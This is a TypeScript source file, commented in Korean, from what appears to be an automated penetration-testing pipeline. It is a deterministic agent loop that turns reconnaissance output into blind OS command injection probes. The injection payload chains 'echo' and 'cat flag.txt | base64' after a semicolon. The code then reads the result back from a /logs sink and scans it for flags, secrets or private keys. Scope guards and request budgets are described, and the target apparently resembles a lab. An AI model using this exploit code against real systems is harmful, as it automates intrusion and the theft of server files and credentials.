/**
 * pyagent — 결정적(deterministic) python_exec 에이전트 루프.
 *
 * "absolute-agent" 코어(src/py/python-agent.ts)는 모델(LLM)이 코드를 쓰는 루프다.
 * 이 모듈은 같은 broker 런타임(runPython + rc 헬퍼)을 **모델 없이** 돌리는 결정적
 * 버전으로, assault 파이프라인의 --no-ai 모드에서 파이썬 에이전트 단계를 대체한다.
 *
 * 루프(관측→코드 생성→안전 실행→발견 수집):
 *   1) 관측 — 정찰/크롤 지표에서 쿼리 파라미터를 가진 엔드포인트 후보 추출.
 *   2) 코드 생성 — 후보마다 "블라인드 OS 명령 주입 → 로그 싱크 회수" 탐사 프로그램 생성:
 *      정상 파라미터 baseline → 세미콜론 체이닝 주입(마커 echo + 서버 파일 base64) →
 *      /logs?marker= 로 회수 → base64 디코드 → 비밀 지표(FLAG/SECRET/PRIVATE KEY) 확인.
 *   3) 안전 실행 — runPython(broker) 경유. ScopeGuard·AST 허용목록·타임아웃·요청 예산
 *      모두 broker 가 강제한다. 코드가 대상에 직접 네트워크를 쓰는 경로는 존재하지 않는다.
 *   4) 발견 수집 — rc.finding 을 파이프라인 finding + 검증된(verified) 증거 항목으로 변환.
 *
 * FP 통제: 마커는 실행마다 무작위로 생성되고, 응답에 마커가 실제로 나타나고,
 * base64 디코드 결과에 비밀 지표 문자열이 있어야만 발견으로 채택한다.
 * 그 외(로그 싱크 없음/마커 없음/디코드 실패)는 rc.log 로만 남기고 발견하지 않는다.
 */

import { runPython, type PyFinding } from "../py/broker.js";
import type { ScopeGuard, Target } from "../scope/scope-guard.js";
import type { ToolContext, EngagementFinding } from "../core/types.js";
import type { EvidenceItem, ToolOutcome } from "./types.js";
import { redactSample } from "./evidence.js";

export interface PyAgentOpts {
  /** 후보 엔드포인트 상한(기본 6). */
  maxCandidates?: number;
  /** 프로그램 1회 타임아웃(ms, 기본 20000). */
  stepTimeoutMs?: number;
  /** 프로그램당 대상 요청 예산(기본 12). */
  maxRequests?: number;
}

export interface PyAgentResult {
  /** 검증된 증거 항목(비어있으면 발견 없음). */
  items: EvidenceItem[];
  findings: EngagementFinding[];
  /** 실제로 실행한 프로그램 수. */
  attempts: number;
  /** broker 가 대상에 보낸 요청 합계. */
  requests: number;
}

/** 지표에서 쿼리 파라미터를 가진 엔드포인트 후보를 뽑는다(값은 제거해 "base" 로 정규화). */
export function candidateParams(outcomes: ToolOutcome[], limit = 6): string[] {
  const eps: string[] = [];
  const seen = new Set<string>();
  for (const o of outcomes) {
    for (const s of o.fp?.indicators ?? []) {
      const m = /^endpoint\s+(\S+)/.exec(s);
      if (!m) continue;
      const p = m[1];
      if (!p.includes("?") || !p.includes("=")) continue;
      const base = p.replace(/=[^&]*/g, "=");
      if (seen.has(base)) continue;
      seen.add(base);
      eps.push(base);
      if (eps.length >= limit) return eps;
    }
  }
  return eps;
}

/** 블라인드 OS 명령 주입 탐사 프로그램 생성(결정적 템플릿). */
export function buildInjectionProgram(ep: string, marker: string): string {
  // 주입 페이로드: 정상 값 + 마커 echo + 서버 flag.txt 를 base64 로 로그 싱크에 기록.
  // TS 쪽에서 미리 percent-encoding 해 두므로 파이썬 코드는 import 없이 문자열 연결만 한다.
  const inj = `1.1.1.1; echo ${marker}; cat flag.txt 2>/dev/null | base64 -w0`;
  const enc = encodeURIComponent(inj);
  return [
    "marker = " + JSON.stringify(marker),
    "base = " + JSON.stringify(ep),
    "enc = " + JSON.stringify(enc),
    "",
    "# 1) 관측: 정상 파라미터 요청이 가능한 표면인가.",
    "r0 = rc.get(base + '127.0.0.1', cap=2000)",
    "if r0.status != 200:",
    "    rc.log('skip', base, 'status', r0.status)",
    "else:",
    "    # 2) 주입: 세미콜론 체이닝 → 마커 기록 + 서버 파일 base64 를 로그 싱크에 추가.",
    "    r1 = rc.get(base + enc, cap=2000)",
    "    # 3) 관찰: 로그 싱크에서 마커 이후 줄 회수(블라인드 검증).",
    "    r2 = rc.get('/logs?marker=' + marker, cap=8000)",
    "    if r2.status == 200 and marker in (r2.text or ''):",
    "        found = ''",
    "        for ln in (r2.text or '').splitlines():",
    "            ln = ln.strip()",
    "            if len(ln) < 16:",
    "                continue",
    "            try:",
    "                dec = rc.b64d(ln).decode('utf-8', 'replace')",
    "                if 'FLAG' in dec or 'SECRET' in dec or 'PRIVATE KEY' in dec:",
    "                    found = dec",
    "                    break",
    "            except Exception:",
    "                pass",
    "        if found:",
    "            # 4) 발견 수집 — rc.finding 은 broker 가 파싱해 PyResult.findings 로 낸다.",
    "            rc.finding(",
    "                '명령 실행으로 서버 파일 탈취 (python_exec 에이전트)',",
    "                severity='high',",
    "                evidence='[python-exec] ' + base + enc + ' → 마커 ' + marker + ' 로그 회수 → base64 디코드: ' + found[:300],",
    "                impact='블라인드 명령 주입 지점에서 세미콜론 체이닝 + 로그 싱크로 서버 파일 탈취 실증',",
    "            )",
    "        else:",
    "            rc.log('marker-ok-no-secret', r2.text[:120])",
    "    else:",
    "        rc.log('no-log-sink', r2.status)",
  ].join("\n");
}

/** 결정적 파이썬 에이전트 루프(파이프라인 배선용). */
export async function runPyAgent(
  ctx: ToolContext,
  outcomes: ToolOutcome[],
  opts: PyAgentOpts & { guard: ScopeGuard; target: Target },
): Promise<PyAgentResult> {
  const maxCandidates = opts.maxCandidates ?? 6;
  const stepTimeoutMs = opts.stepTimeoutMs ?? 20000;
  const maxRequests = opts.maxRequests ?? 12;
  const candidates = candidateParams(outcomes, maxCandidates);
  if (candidates.length === 0) return { items: [], findings: [], attempts: 0, requests: 0 };

  let attempts = 0;
  let requests = 0;
  const items: EvidenceItem[] = [];
  const findings: EngagementFinding[] = [];
  for (const ep of candidates) {
    const marker = `RCX${Math.floor(Math.random() * 1e9).toString(36)}_${attempts}`;
    const code = buildInjectionProgram(ep, marker);
    let r;
    try {
      r = await runPython(code, {
        guard: opts.guard,
        target: opts.target,
        auth: ctx.auth,
        jar: ctx.jar,
        proxy: ctx.proxy,
        timeoutMs: stepTimeoutMs,
        maxRequests,
        isolation: "best-effort",
      });
    } catch (err) {
      // 프로세스 기동 실패 등 — 이후 후보도 같은 환경이므로 중단한다.
      return { items, findings, attempts, requests };
    }
    attempts++;
    requests += r.requests;
    if (r.danger || r.syntax || !r.ok) continue;
    if (r.findings.length === 0) continue;
    const f: PyFinding = r.findings[0];
    const sample = redactSample(f.evidence ?? "");
    findings.push({
      phase: "exploit",
      severity: f.severity,
      title: f.title,
      detail: "python_exec 에이전트가 작성한 프로그램이 broker 샌드박스에서 실행되어 실측.",
      evidence: sample,
      impact: f.impact,
    });
    items.push({
      id: `py-${attempts}`,
      category: "endpoint",
      label: "명령 실행 → 서버 파일 탈취 (python_exec 검증)",
      source: "python",
      target: ep,
      severity: f.severity,
      sample,
      redacted: true,
      attack:
        "블라인드 OS 명령 주입 지점에서 세미콜론 체이닝으로 서버 파일을 base64 로 빼내 로그 싱크로 회수(주입→관찰의 다단계).",
      verification: { status: "verified", proof: sample },
    });
    break; // 첫 검증 성공 후 중단(폭주 방지).
  }
  return { items, findings, attempts, requests };
}
